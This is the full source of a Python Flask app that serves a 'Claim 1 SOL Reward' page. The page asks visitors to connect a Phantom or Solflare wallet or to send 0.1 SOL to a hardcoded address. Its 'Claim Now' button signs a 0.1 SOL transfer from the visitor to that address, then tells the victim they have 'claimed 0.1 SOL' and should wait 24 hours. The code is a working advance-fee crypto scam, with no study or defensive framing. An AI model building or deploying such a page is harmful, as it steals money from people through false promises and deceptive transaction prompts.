from flask import Flask, render_template_string

app = Flask(__name__)

WALLET_ADDRESS = "79vGoijbHkY324wioWsi2uL62dyc1c3H1945Pb71RCVz"
QR_CODE_URL = "https://raw.githubusercontent.com/markosgiassa1/coinupdater_bot/main/WelcomeCoinUpdater_qrcode.png"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Claim 1 SOL</title>
<style>
  body {
    background-color: #000;
    color: white;
    font-family: sans-serif;
    text-align: center;
    padding: 40px;
  }
  img.qr {
    width: 220px;
    margin: 20px auto;
    border-radius: 16px;
    box-shadow: 0 0 20px #00ff90;
    display: none;
  }
  .wallet-button, .claim-button {
    background: linear-gradient(90deg, #00ff90, #00d178);
    border: none;
    padding: 14px 30px;
    font-size: 1.2em;
    margin: 15px;
    border-radius: 30px;
    cursor: pointer;
    color: #000;
    font-weight: bold;
  }
</style>
<!-- Solana wallet adapter + scripts -->
<script type="module">
  import {
    Connection,
    PublicKey,
    SystemProgram,
    Transaction
  } from "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.0/+esm";

  let provider = null;

  function updateStatus(text) {
    document.getElementById("walletStatus").innerText = text;
  }

  async function detectProvider() {
    if (window.solana && (window.solana.isPhantom || window.solana.isSolflare)) {
      provider = window.solana;
      return provider;
    } else if (window.phantom && window.phantom.solana) {
      provider = window.phantom.solana;
      return provider;
    }
    return null;
  }

  async function connectWallet() {
    updateStatus("Detecting wallet...");
    provider = await detectProvider();

    if (!provider) {
      // No provider detected, open deep link to Solflare or Phantom mobile app
      // You can try Solflare deep link first, fallback to Phantom

      const solflareDeepLink = "solflare://connect";
      const phantomDeepLink = "phantom://";

      // Try to open solflare deep link (this will open the app if installed)
      updateStatus("No wallet detected. Opening wallet app...");
      window.location.href = solflareDeepLink;

      // After this, user returns to browser and reloads to connect wallet manually

      // Show QR code fallback after 5 seconds if no wallet connected
      setTimeout(() => {
        updateStatus("No wallet connection detected. Please send 0.1 SOL manually.");
        document.getElementById("qrCode").style.display = "block";
        document.getElementById("connectWalletBtn").disabled = true;
        document.getElementById("claimBtn").disabled = true;
      }, 5000);

      return;
    }

    try {
      const res = await provider.connect();
      updateStatus("Wallet Connected: " + res.publicKey.toString());
      document.getElementById("connectWalletBtn").disabled = true;
      document.getElementById("claimBtn").disabled = false;
    } catch (err) {
      alert("Wallet connection failed: " + err.message);
      updateStatus("Wallet connection failed");
    }
  }

  async function sendTransaction() {
    if (!provider || !provider.publicKey) {
      alert("Please connect your wallet first.");
      return;
    }

    const connection = new Connection("https://api.mainnet-beta.solana.com");

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: provider.publicKey,
        toPubkey: new PublicKey("{{ wallet }}"),
        lamports: 0.1 * 1e9
      })
    );

    try {
      const { signature } = await provider.signAndSendTransaction(transaction);
      await connection.confirmTransaction(signature);
      alert("✅ Transaction sent! You’ve claimed 0.1 SOL. Please wait 24 hours.");
    } catch (e) {
      console.error(e);
      alert("❌ Transaction failed: " + e.message);
    }
  }

  window.connectWallet = connectWallet;
  window.sendTransaction = sendTransaction;
</script>
</head>
<body>
  <h1>Claim 1 SOL Reward</h1>
  <p>Send exactly <b>0.1 SOL</b> to:</p>
  <p><code>{{ wallet }}</code></p>
  <img id="qrCode" src="{{ qr_url }}" class="qr" alt="QR Code" />
  <p id="walletStatus">Click "Connect Wallet" to begin</p>
  <button id="connectWalletBtn" onclick="connectWallet()" class="wallet-button">Connect Wallet</button>
  <button id="claimBtn" onclick="sendTransaction()" class="claim-button" disabled>Claim Now</button>
  <footer style="margin-top: 60px; font-size: 0.9em; color: #aaa;">&copy; 2025 CoinUpdater</footer>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML_TEMPLATE, wallet=WALLET_ADDRESS, qr_url=QR_CODE_URL)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8080)
